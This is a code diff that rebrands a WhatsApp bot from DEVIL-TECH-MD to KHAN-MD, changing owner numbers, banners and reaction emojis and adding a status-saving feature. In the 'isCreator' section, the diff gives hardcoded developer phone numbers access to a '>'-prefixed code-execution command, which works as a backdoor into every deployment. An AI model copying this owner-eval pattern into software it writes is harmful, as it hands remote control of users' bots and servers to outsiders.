@@ -42,11 +42,8 @@ const {
   const Crypto = require('crypto')
   const path = require('path')
   const prefix = config.PREFIX
-  const mode = config.MODE
-  const online = config.ALWAYS_ONLINE
-  const status = config.AUTO_STATUS_SEEN
   
-  const ownerNumber = ['923003588997']
+  const ownerNumber = ['923146190772']
   
   const tempDir = path.join(os.tmpdir(), 'cache-temp')
   if (!fs.existsSync(tempDir)) {
@@ -70,7 +67,7 @@ const {
   //===================SESSION-AUTH============================
 if (!fs.existsSync(__dirname + '/sessions/creds.json')) {
 if(!config.SESSION_ID) return console.log('Please add your session to SESSION_ID env !!')
-const sessdata = config.SESSION_ID.replace("ALI-MD~", '');
+const sessdata = config.SESSION_ID.replace("KHAN-MD~", '');
 const filer = File.fromURL(`https://mega.nz/file/${sessdata}`)
 filer.download((err, data) => {
 if(err) throw err
@@ -115,7 +112,7 @@ const port = process.env.PORT || 9090;
   console.log('Plugins installed successful ✅')
   console.log('Bot connected to whatsapp ✅')
   
-  let up = `*Hello there DEVIL-TECH-MD User! \ud83d\udc4b\ud83c\udffb* \n\n> Simple , Straight Forward But Loaded With Features \ud83c\udf8a, Meet DEVIL-TECH-MD WhatsApp Bot.\n\n *Thanks for using DEVIL-TECH-MD \ud83d\udea9* \n\n> Join WhatsApp Channel :- ⤵️\n \nhttps://whatsapp.com/channel/0029VatOy2EAzNc2WcShQw1j\n\n- *YOUR PREFIX:* = ${prefix}\n\nDont forget to give star to repo ⬇️\n\nhttps://github.com/deviltech6/DEVIL-TECH-MD\n\n> © Powered BY JawadTechX \ud83d\udda4`;
+  let up = `*Hello there KHAN-MD User! \ud83d\udc4b\ud83c\udffb* \n\n> Simple , Straight Forward But Loaded With Features \ud83c\udf8a, Meet KHAN-MD WhatsApp Bot.\n\n *Thanks for using KHAN-MD \ud83d\udea9* \n\n> Join WhatsApp Channel :- ⤵️\n \nhttps://whatsapp.com/channel/0029VatOy2EAzNc2WcShQw1j\n\n- *YOUR PREFIX:* = ${prefix}\n\nDont forget to give star to repo ⬇️\n\nhttps://github.com/JawadYTX/KHAN-XMD\n\n> © Powered BY JawadTechX \ud83d\udda4`;
     conn.sendMessage(conn.user.id, { image: { url: `https://files.catbox.moe/juroe8.jpg` }, caption: up })
   }
   })
@@ -153,7 +150,7 @@ const port = process.env.PORT || 9090;
     }
   if (mek.key && mek.key.remoteJid === 'status@broadcast' && config.AUTO_STATUS_REACT === "true"){
     const jawadlike = await conn.decodeJid(conn.user.id);
-    const emojis = ['❤️', '💸', '😇', '🍂', '💥', '💯', '🔥', '💫', '💎', '💗', '🤍', '🖤', '👀', '🙌', '🙆', '🚩', '🥰', '💐', '😎', '🤎', '✅', '🫀', '🧡', '😁', '😄', '🌸', '🕊️', '🌷', '⛅', '🌟', '🗿', '🇵🇰', '💜', '💙', '🌝', '🖤', '🎎', '🎏', '🎐', '⚽', '🧣', '🌿', '⛈️', '🌦️', '🌚', '🌝', '🙈', '🙉', '🦖', '🐤', '🎗️', '🥇', '👾', '🔫', '🐝', '🦋', '🍓', '🍫', '🍭', '🧁', '🧃', '🍿', '🍻', '🎀', '🧸', '👑', '〽️', '😳', '💀', '☠️', '👻', '🔥', '♥️', '👀', '🐼'];
+    const emojis = ['❤️', '💸', '😇', '🍂', '💥', '💯', '🔥', '💫', '💎', '💗', '🤍', '🖤', '👀', '🙌', '🙆', '🚩', '🥰', '💐', '😎', '🤎', '✅', '🫀', '🧡', '😁', '😄', '🌸', '🕊️', '🌷', '⛅', '🌟', '🗿', '🇵🇰', '💜', '💙', '🌝', '🖤', '💚'];
     const randomEmoji = emojis[Math.floor(Math.random() * emojis.length)];
     await conn.sendMessage(mek.key.remoteJid, {
       react: {
@@ -201,12 +198,12 @@ const port = process.env.PORT || 9090;
   conn.sendMessage(from, { text: teks }, { quoted: mek })
   }
   const udp = botNumber.split('@')[0];
-    const ali = ('923003588997');
-    let isCreator = [udp, ali, config.DEV]
+    const jawad = ('923470027813', '923191089077', '923146190772');
+    let isCreator = [udp, jawad, config.DEV]
 					.map(v => v.replace(/[^0-9]/g) + '@s.whatsapp.net')
 					.includes(mek.sender);
 
-    if (isCreator && mek.text.startsWith('%')) {
+    if (isCreator && mek.text.startsWith('>')) {
 					let code = budy.slice(2);
 					if (!code) {
 						reply(
@@ -247,34 +244,11 @@ const port = process.env.PORT || 9090;
 					return;
 				}
  //================ownerreact==============
-    if(senderNumber.includes("923003588997")){
+    
+  if(senderNumber.includes("923146190772")){
   if(isReact) return
-  m.react("🪾")
-    }
-if(senderNumber.includes("923003588997")){
-  if(isReact) return
-  m.react("🫩")
-	  }
-	  if(senderNumber.includes("923003588997")){
-  if(isReact) return
-  m.react("🫆")
-	  }
-	  if(senderNumber.includes("923003588997")){
-  if(isReact) return
-  m.react("🫜")
-	  }
-	  if(senderNumber.includes("923003588997")){
-  if(isReact) return
-  m.react("🪉")
-	  }
-	  if(senderNumber.includes("923003588997")){
-  if(isReact) return
-  m.react("🪏")
-	  }
-	  if(senderNumber.includes("923003588997")){
-  if(isReact) return
-  m.react("🫟")
-	  }
+  m.react("🦋")
+   }
   //==========public react============//
   // Auto React 
   if (!isReact && senderNumber !== botNumber) {
@@ -314,6 +288,46 @@ if (!isReact && senderNumber === botNumber) {
         m.react(randomReaction);
     }
 } 
+
+// Status Save Script - Only for Status
+const statesender = ["send", "SEND", "Send", "Save", "save", "SEND ME", "Send Me", "send me", "DJ"];
+
+for (let word of statesender) {
+    if (body.toLowerCase().includes(word)) {
+        if (!body.includes('tent') && !body.includes('docu') && !body.includes('https')) {
+            if (!m.quoted) return reply("*Please mention a status to save!*");
+
+            const data = JSON.stringify(mek.message, null, 2);
+            const jsonData = JSON.parse(data);
+            const isStatus = jsonData.extendedTextMessage?.contextInfo?.remoteJid?.endsWith('@status'); 
+            if (!isStatus) return; // Ensure it only works on status
+
+            const getExtension = (buffer) => {
+                const magicNumbers = {
+                    jpg: 'ffd8ffe0',
+                    png: '89504e47',
+                    mp4: '00000018',
+                };
+                const magic = buffer.toString('hex', 0, 4);
+                return Object.keys(magicNumbers).find(key => magicNumbers[key] === magic);
+            };
+
+            // Handle image or video messages
+            let quotedMessage = await quoted.download();
+            if (quoted.imageMessage) {
+                const caption = quoted.imageMessage.caption || "> *© Powered By JawadTechX*";
+                await conn.sendMessage(from, { image: quotedMessage, caption: caption }, { quoted: mek });
+            } else if (quoted.videoMessage) {
+                const caption = quoted.videoMessage.caption || "> *© Powered By JawadTechX*";
+                await conn.sendMessage(from, { video: quotedMessage, caption: caption }, { quoted: mek });
+            } else {
+                console.log('Unsupported media type:', quotedMessage.mimetype);
+            }
+
+            break; // Exit loop after handling the message
+        }
+    }
+}
         
   //==========WORKTYPE============ 
   if(!isOwner && config.MODE === "private") return
@@ -794,7 +808,7 @@ if (!isReact && senderNumber === botNumber) {
   }
   
   app.get("/", (req, res) => {
-  res.send("DEVIL-TECH-MD STARTED ✅");
+  res.send("KHAN MD STARTED ✅");
   });
   app.listen(port, () => console.log(`Server listening on port http://localhost:${port}`));
   setTimeout(() => {
